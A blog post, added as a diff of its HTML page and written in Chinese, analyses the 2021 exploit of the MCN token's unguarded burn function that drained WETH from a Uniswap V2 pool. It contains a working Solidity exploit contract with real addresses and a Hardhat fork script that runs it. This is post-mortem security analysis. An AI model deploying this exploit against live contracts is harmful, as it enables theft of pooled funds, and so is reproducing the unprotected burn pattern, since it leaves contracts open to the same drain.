@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>mcn套利分析 | SCS</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="复盘分析、套利" />
+  
+  
+  
+  
+  <meta name="description" content="1.攻击者使用0.01Weth从**Uniswap V2: MCN-WETH **中swap出7022 MCN；  2.攻击者调用MCN的burn函数，将Uniswap V2: MCN-WETH的MCN余额销毁，使得Uniswap V2: MCN-WETH的MCN数量变为10；  3.攻击者从Uniswap V2: MCN-WETH池中，将7022个MCN swap 出38.4个WETH。  原">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MCN套利分析">
+<meta property="og:url" content="http://example.com/2021/11/04/MCN%E5%A5%97%E5%88%A9%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="SCS">
+<meta property="og:description" content="1.攻击者使用0.01Weth从**Uniswap V2: MCN-WETH **中swap出7022 MCN；  2.攻击者调用MCN的burn函数，将Uniswap V2: MCN-WETH的MCN余额销毁，使得Uniswap V2: MCN-WETH的MCN数量变为10；  3.攻击者从Uniswap V2: MCN-WETH池中，将7022个MCN swap 出38.4个WETH。  原">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/2021/11/04/MCN%E5%A5%97%E5%88%A9%E5%88%86%E6%9E%90/Snipaste_2021-11-04_19-17-11.png">
+<meta property="og:image" content="http://example.com/2021/11/04/MCN%E5%A5%97%E5%88%A9%E5%88%86%E6%9E%90/Snipaste_2021-11-04_19-28-07.png">
+<meta property="og:image" content="http://example.com/2021/11/04/MCN%E5%A5%97%E5%88%A9%E5%88%86%E6%9E%90/Snipaste_2021-11-04_19-30-18.png">
+<meta property="og:image" content="http://example.com/2021/11/04/MCN%E5%A5%97%E5%88%A9%E5%88%86%E6%9E%90/Snipaste_2021-11-04_19-34-16.png">
+<meta property="og:image" content="http://example.com/2021/11/04/MCN%E5%A5%97%E5%88%A9%E5%88%86%E6%9E%90/Snipaste_2021-11-04_19-37-21.png">
+<meta property="og:image" content="http://example.com/2021/11/04/MCN%E5%A5%97%E5%88%A9%E5%88%86%E6%9E%90/Snipaste_2021-11-04_19-51-00.png">
+<meta property="article:published_time" content="2021-11-04T02:42:40.000Z">
+<meta property="article:modified_time" content="2021-11-04T12:03:13.078Z">
+<meta property="article:author" content="Janson Woods">
+<meta property="article:tag" content="复盘分析、套利">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/11/04/MCN%E5%A5%97%E5%88%A9%E5%88%86%E6%9E%90/Snipaste_2021-11-04_19-17-11.png">
+  
+
+  
+
+  <link rel="icon" href="/css/images/mylogo.jpg">
+  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt; src:url("/css/fonts/FuturaPTBold.otf") format("woff");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt-light; src:url("/css/fonts/FuturaPTBook.otf") format("woff");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt-italic; src:url("/css/fonts/FuturaPTBookOblique.otf") format("woff");font-weight:400;font-style:italic;}
+}
+
+  </style>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+<script src="/js/jquery-3.1.1.min.js"></script>
+
+  
+<script src="/js/bootstrap.js"></script>
+
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    
+<link rel="stylesheet" href="/css/dialog.css">
+
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">Home</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/categories">Categories</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-MCN套利分析" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      MCN套利分析
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2021/11/04/MCN%E5%A5%97%E5%88%A9%E5%88%86%E6%9E%90/" class="article-date">
+	  <time datetime="2021-11-04T02:42:40.000Z" itemprop="datePublished">2021-11-04</time>
+	</a>
+
+      
+      
+	<a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		PV:<span id="busuanzi_value_page_pv"></span>
+	</span>
+	</a>
+
+      
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="/2021/11/04/MCN%E5%A5%97%E5%88%A9%E5%88%86%E6%9E%90/Snipaste_2021-11-04_19-17-11.png" alt="Snipaste_2021-11-04_19-17-11"></p>
+<p>1.攻击者使用0.01Weth从**Uniswap V2: MCN-WETH **中swap出7022 MCN；</p>
+<p><img src="/2021/11/04/MCN%E5%A5%97%E5%88%A9%E5%88%86%E6%9E%90/Snipaste_2021-11-04_19-28-07.png" alt="Snipaste_2021-11-04_19-28-07"></p>
+<p>2.攻击者调用MCN的burn函数，将<strong>Uniswap V2: MCN-WETH</strong>的MCN余额销毁，使得<strong>Uniswap V2: MCN-WETH</strong>的MCN数量变为10；</p>
+<p><img src="/2021/11/04/MCN%E5%A5%97%E5%88%A9%E5%88%86%E6%9E%90/Snipaste_2021-11-04_19-30-18.png" alt="Snipaste_2021-11-04_19-30-18"></p>
+<p>3.攻击者从<strong>Uniswap V2: MCN-WETH</strong>池中，将7022个MCN swap 出38.4个WETH。</p>
+<p><img src="/2021/11/04/MCN%E5%A5%97%E5%88%A9%E5%88%86%E6%9E%90/Snipaste_2021-11-04_19-34-16.png" alt="Snipaste_2021-11-04_19-34-16"></p>
+<h3 id="原因分析："><a href="#原因分析：" class="headerlink" title="原因分析："></a>原因分析：</h3><p><img src="/2021/11/04/MCN%E5%A5%97%E5%88%A9%E5%88%86%E6%9E%90/Snipaste_2021-11-04_19-37-21.png" alt="Snipaste_2021-11-04_19-37-21"></p>
+<p>MCN的burn(address _who, uint _value)函数逻辑中，可以将任何使用者的代币销毁掉，并没有进行身份和权限的认定。攻击将事先swap出7022个MCN，后利用MCN合约设计缺陷，使得<strong>Uniswap V2: MCN-WETH</strong>池中MCN的代币数量消耗到一个很小的值，使得MCN相对于WETH的价格非常高，攻击者后使用7022MCN将<strong>Uniswap V2: MCN-WETH</strong>池中的WETH全部掏空。</p>
+<h3 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h3><p>攻击合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">// https://etherscan.io/tx/0xd091afe6b37256ebb3dd703a9646b27aaf7ce7fe8832778886ba0216361f7f00</span><br><span class="line">import &quot;./Mcn.sol&quot;;</span><br><span class="line">import &quot;./MEpair.sol&quot;;</span><br><span class="line">import &quot;./Weth.sol&quot;;</span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    Mcn mcn = Mcn(0xc047C42554c6495c85108aE8ee66fA4E3B88176d);</span><br><span class="line">    MEpair pair = MEpair(0x6c239518495F92363Ad341B2290984EDA7623d1e);</span><br><span class="line">    Weth weth = Weth(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);</span><br><span class="line">    address owner = 0x0B61982356cF13D4CAAACa906f0fD8CB1e3d1e76;</span><br><span class="line"></span><br><span class="line">    uint eamount = 0.01 ether;</span><br><span class="line">    uint mamount = 7022000000000000000000;</span><br><span class="line">    uint burn =  27126220522013288881625851;</span><br><span class="line">    uint ethamount = 38465407605677952801;</span><br><span class="line"></span><br><span class="line">    function start() public &#123;</span><br><span class="line">        weth.deposit&#123;value:2000000000000000000&#125;();</span><br><span class="line">        weth.transfer(address(pair),eamount);</span><br><span class="line">        pair.swap(0,mamount,address(this),&quot;&quot;);</span><br><span class="line">        mcn.burn(address(pair),burn);</span><br><span class="line">        pair.sync();</span><br><span class="line">        mcn.transfer(address(pair),mamount);</span><br><span class="line">        pair.swap(ethamount,0,owner,&quot;&quot;);</span><br><span class="line">        uint balance = weth.balanceOf(address(owner));</span><br><span class="line">        console.log(&quot;profit:  &quot;,balance / 1 ether);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>部署脚本：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// We require the Hardhat Runtime Environment explicitly here. This is optional</span></span><br><span class="line"><span class="comment">// but useful for running the script in a standalone fashion through `node &lt;script&gt;`.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// When running the script with `npx hardhat run &lt;script&gt;` you&#x27;ll find the Hardhat</span></span><br><span class="line"><span class="comment">// Runtime Environment&#x27;s members available in the global scope.</span></span><br><span class="line"><span class="keyword">const</span> &#123; ethers, network &#125; = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> hre = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> sender = <span class="string">&quot;0x56178a0d5F301bAf6CF3e1Cd53d9863437345Bf9&quot;</span>;</span><br><span class="line">  <span class="keyword">const</span> Weth = <span class="string">&quot;0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2&quot;</span>;</span><br><span class="line">  [add1] = <span class="keyword">await</span> ethers.getSigners();</span><br><span class="line">  <span class="keyword">await</span> hre.network.provider.request(&#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&quot;hardhat_impersonateAccount&quot;</span>,</span><br><span class="line">    <span class="attr">params</span>: [sender],</span><br><span class="line">  &#125;);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">const</span> signer = <span class="keyword">await</span> ethers.provider.getSigner(sender);</span><br><span class="line">  <span class="keyword">const</span> Test = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> test = <span class="keyword">await</span> Test.deploy();</span><br><span class="line">  <span class="keyword">await</span> test.deployed();</span><br><span class="line">  <span class="comment">// 用模拟的账户给指定账户转账</span></span><br><span class="line">  <span class="keyword">await</span> signer.sendTransaction(&#123;</span><br><span class="line">    <span class="attr">to</span>: test.address,</span><br><span class="line">    <span class="attr">value</span>: ethers.utils.parseEther(<span class="string">&quot;3.0&quot;</span>),</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;向合约地址转账3ETH&#x27;</span>)</span><br><span class="line">  <span class="keyword">await</span> test.start();</span><br><span class="line">    <span class="comment">// 取消模拟</span></span><br><span class="line">  <span class="keyword">await</span> hre.network.provider.request(&#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&quot;hardhat_stopImpersonatingAccount&quot;</span>,</span><br><span class="line">    <span class="attr">params</span>: [sender],</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main().catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.error(error);</span><br><span class="line">  process.exitCode = <span class="number">1</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// npx hardhat run test/test.js </span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/04/MCN%E5%A5%97%E5%88%A9%E5%88%86%E6%9E%90/Snipaste_2021-11-04_19-51-00.png" alt="Snipaste_2021-11-04_19-51-00"></p>
+<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>这是一次很典型的利用合约漏洞进行套利的攻击，因此在对合约进行设计时务必要注意到用户权限的界定和身份的检查！</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>Post author:  </strong>Janson Woods</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>Post link:  </strong>
+          <a href="/2021/11/04/MCN套利分析/" target="_blank" title="MCN套利分析">http://example.com/2021/11/04/MCN套利分析/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>Copyright Notice:   </strong>
+            All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            unless stating additionally.
+          </li>
+         
+        </ul>
+<div>
+
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E5%A5%97%E5%88%A9/" rel="tag">复盘分析、套利</a></li></ul>
+
+      
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/10/22/Eminence(EMN)%E9%97%AA%E7%94%B5%E8%B4%B7%E6%94%BB%E5%87%BB%E5%BD%B1%E5%93%8D%E4%BB%B7%E6%A0%BC%E5%A5%97%E5%88%A9/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Eminence (EMN)闪电贷套利攻击</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">原因分析：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">POC：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">总结：</span></a></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2013 - 2021 SCS All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				UV : <span id="busuanzi_value_site_uv"></span> |  
+				PV : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/categories" class="mobile-nav-link">Categories</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+
+  
+<script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            SCS
+          </div>
+          <div class="panel-body">
+            Copyright © 2021 Janson Woods All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
